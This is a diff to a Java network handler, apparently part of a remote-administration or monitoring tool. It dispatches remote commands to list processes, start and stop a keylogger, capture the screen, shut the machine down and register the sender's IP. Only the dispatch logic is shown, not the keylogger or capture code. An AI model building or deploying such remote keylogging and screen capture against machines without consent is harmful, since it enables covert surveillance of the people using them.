@@ -30,6 +30,7 @@ public class ActionThread extends Thread {
 			this.main = main;
 		} catch (Exception e) {
 			// TODO: handle exception
+			System.out.println("e ActionThread");
 		}
 
 	}
@@ -38,16 +39,14 @@ public class ActionThread extends Thread {
 	public void run() {
 		try {
 			ObjectOutputStream oos = new ObjectOutputStream(outputStream);
-			ObjectInputStream ois = new ObjectInputStream(inputStream); // throws in first run, need to anylize what
-																		// happened in first run
+			ObjectInputStream ois = new ObjectInputStream(inputStream); 
 
 			String request = (String) ois.readObject();
-
-			System.out.println(request);
-
 			String[] request_elements = request.split(" ");
 
-			if (request.equals("GET_PROCESS_LIST")) {
+			if (request.equals("START")) {
+				main.addToIpList(fromIP);
+			} else if (request.equals("GET_PROCESS_LIST")) {
 				ListProcess listProcess = new ListProcess(oos);
 				listProcess.set_listProcess();
 				listProcess.sendListProcess();
@@ -111,23 +110,16 @@ public class ActionThread extends Thread {
 					this.record += "name not found";
 				}
 				main.actionRecorded(fromIP, record);
-			}
-
-			else if (request.equals("KEY_LOGGER_START")) {
+			} else if (request.equals("KEY_LOGGER_START")) {
 				KeyLogger keyLogger = new KeyLogger(oos, "");
 				keyLogger.get_Keylogger(oos);
-			}
-
-			else if (request.equals("KEY_LOGGER_STOP")) {
-				KeyLogger keyLogger = new KeyLogger(oos, "");			
+			} else if (request.equals("KEY_LOGGER_STOP")) {
+				KeyLogger keyLogger = new KeyLogger(oos, "");
 				keyLogger.send_KeyLogger();
-			
-			} else if(request.equals("SHUT_DOWN")) {
+			} else if (request.equals("SHUT_DOWN")) {
 				ShutDown shutDown = new ShutDown(oos);
 				shutDown.shutDown();
-			}
-
-			else if (request.equals("SCREEN_CAPTURE")) {
+			} else if (request.equals("SCREEN_CAPTURE")) {
 				ScreenCapture screenCapture = new ScreenCapture(oos);
 				boolean res = screenCapture.get_Screenshot();
 				screenCapture.send_ScreenShot();
@@ -137,26 +129,23 @@ public class ActionThread extends Thread {
 					this.record += " - failed";
 				}
 				main.actionRecorded(fromIP, record);
+			} else if (request.equals("END")) {
+				main.removeFromIpList(fromIP);
+			} else if (request.equals("CHECK")) {
+				// Do nothing
 			}
-
-			else {
-				throw new Exception();
-			}
-
-			
 			oos.close();
 			ois.close();
 		} catch (StreamCorruptedException sce) {
-			System.out.println("sce");
+			System.out.println("sce run ActionThread");
 		} catch (IOException ioe) {
-			// Catch on first run, need to check!
-			main.addToIpList(fromIP);
+			System.out.println("ioe run ActionThread");
 		} catch (SecurityException se) {
-			System.out.println("se");
+			System.out.println("se run ActionThread");
 		} catch (NullPointerException npe) {
-			System.out.println("npe");
+			System.out.println("npe run ActionThread");
 		} catch (Exception e) {
-			System.out.println("e");
+			System.out.println("e run ActionThread");
 		}
 
 	}
